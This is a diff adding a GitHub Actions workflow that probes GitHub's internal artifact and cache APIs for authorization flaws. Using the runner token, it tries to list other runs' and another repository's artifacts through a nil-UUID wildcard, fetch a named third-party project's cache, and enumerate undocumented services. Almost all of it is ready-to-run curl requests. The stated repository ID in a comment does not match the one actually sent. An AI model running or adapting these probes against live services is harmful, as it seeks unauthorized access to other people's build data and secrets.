@@ -1,0 +1,135 @@
+name: ZeroDayProbe16-CrossRun-CrossRepo-Cache
+# Hypothesis: Actions.GenericRead:nil-UUID is truly global — no run/repo validation.
+# If correct: any valid ACTIONS_RUNTIME_TOKEN can read artifacts from ANY run on GitHub.
+# Tests:
+#   T1 — Cross-run: use current token against OLD run's PLAN_ID (same repo)
+#   T2 — Cross-repo: use current token against PLAN_ID from DIFFERENT repo
+#   T3 — Nil-UUID as JOB_ID: does listing work without knowing the actual JOB_ID?
+#   T4 — CacheService BOLA: GetCacheEntryDownloadURL cross-job
+#   T5 — CacheService no-metadata: omit repositoryId/scope entirely
+#   T6 — Twirp service enumeration: discover undocumented services
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  probe16:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract current run IDs
+        run: |
+          # OIDC URL format: https://.../idtoken/{PLAN_ID}/{JOB_ID}?api-version=2.0
+          OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL:-}"
+          if [ -n "$OIDC_URL" ]; then
+            CURRENT_PLAN=$(echo "$OIDC_URL" | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | head -1)
+            CURRENT_JOB=$(echo  "$OIDC_URL" | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' | tail -1)
+            echo "CURRENT_PLAN=$CURRENT_PLAN" >> $GITHUB_ENV
+            echo "CURRENT_JOB=$CURRENT_JOB"   >> $GITHUB_ENV
+            echo "This run PLAN: $CURRENT_PLAN"
+            echo "This run JOB:  $CURRENT_JOB"
+          fi
+
+      - name: "T1 — Cross-run SAME REPO (old PLAN_ID from run 26538053382)"
+        run: |
+          echo "========================================"
+          echo "T1: Cross-run — token from NEW run, IDs from OLD run (same repo)"
+          echo "If HTTP=200 → token is NOT scoped to current run → cross-run BOLA"
+          echo "========================================"
+          # PLAN_ID + JOB_ID from our run 26538053382 (cache-poison-test, already completed)
+          OLD_PLAN="86938ad7-ecde-4055-80ab-443e16b1637a"
+          OLD_JOB="1d364573-6fe4-5801-a859-5972587000b3"
+          curl -s -w "\nHTTP=%{http_code}" \
+            -X POST "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "{\"workflowRunBackendId\":\"$OLD_PLAN\",\"workflowJobRunBackendId\":\"$OLD_JOB\"}"
+          echo ""
+
+      - name: "T2 — Cross-repo (PLAN_ID from terraform-sec-research run 26540022871)"
+        run: |
+          echo "========================================"
+          echo "T2: Cross-REPO — token from cache-poison-test, IDs from terraform-sec-research"
+          echo "If HTTP=200 → nil-UUID wildcard has NO repo boundary → cross-repo BOLA"
+          echo "========================================"
+          # PLAN_ID from our run 26540022871 on dannyggg3/terraform-sec-research (different repo)
+          TERRAFORM_PLAN="c554e1bd-3f75-4dee-8800-ee32291bda7c"
+          NIL_UUID="00000000-0000-0000-0000-000000000000"
+          # Try with nil-UUID as JOB_ID (if cross-repo AND nil-UUID JOB_ID works → full enumeration possible)
+          curl -s -w "\nHTTP=%{http_code}" \
+            -X POST "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "{\"workflowRunBackendId\":\"$TERRAFORM_PLAN\",\"workflowJobRunBackendId\":\"$NIL_UUID\"}"
+          echo ""
+
+      - name: "T3 — Nil-UUID as JOB_ID on current PLAN (enumerate all jobs in run)"
+        run: |
+          echo "========================================"
+          echo "T3: Nil-UUID JOB_ID — does listing return artifacts from ALL jobs in run?"
+          echo "If HTTP=200 with artifacts → JOB_ID is not enforced at all → global enumeration"
+          echo "========================================"
+          NIL_UUID="00000000-0000-0000-0000-000000000000"
+          curl -s -w "\nHTTP=%{http_code}" \
+            -X POST "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "{\"workflowRunBackendId\":\"$CURRENT_PLAN\",\"workflowJobRunBackendId\":\"$NIL_UUID\"}"
+          echo ""
+
+      - name: "T4 — CacheService GetCacheEntryDownloadURL (no metadata)"
+        run: |
+          echo "========================================"
+          echo "T4: CacheService BOLA — GetCacheEntryDownloadURL without repositoryId/scope"
+          echo "If HTTP=200 → cache endpoint has same nil-UUID wildcard issue"
+          echo "========================================"
+          # Omit metadata entirely — server may not validate repo/scope
+          curl -s -w "\nHTTP=%{http_code}" \
+            -X POST "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"key":"node-cache-linux","restore_keys":["node-cache-"],"version":"1"}'
+          echo ""
+
+      - name: "T5 — CacheService with foreign repositoryId (hashicorp/terraform = 17318580)"
+        run: |
+          echo "========================================"
+          echo "T5: CacheService cross-repo via repositoryId"
+          echo "hashicorp/terraform repo ID = 17318580 (from GitHub API)"
+          echo "If HTTP=200 → can read any repo's cache by supplying their numeric repo ID"
+          echo "========================================"
+          # hashicorp/terraform GitHub repo ID
+          curl -s -w "\nHTTP=%{http_code}" \
+            -X POST "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"metadata":{"repositoryId":"17728164","scope":[{"scope":"refs/heads/main","permission":"1"}]},"key":"node-cache-linux","restore_keys":[],"version":"1"}'
+          echo ""
+
+      - name: "T6 — Twirp service enumeration"
+        run: |
+          echo "========================================"
+          echo "T6: Discover undocumented Twirp services"
+          echo "ArtifactService and CacheService confirmed — what else exists?"
+          echo "========================================"
+          BASE="${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1"
+          for SVC in WorkflowService RunnerService StepService LogService SecretService JobService ResultsService AnnotationService; do
+            HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
+              -X POST "$BASE/${SVC}/GetStatus" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{}')
+            echo "  $SVC: HTTP=$HTTP"
+          done
+          echo ""
+          # Also check v2 namespace
+          BASE2="${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v2"
+          for SVC in ArtifactService CacheService; do
+            HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
+              -X POST "$BASE2/${SVC}/GetStatus" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{}')
+            echo "  v2.$SVC: HTTP=$HTTP"
+          done
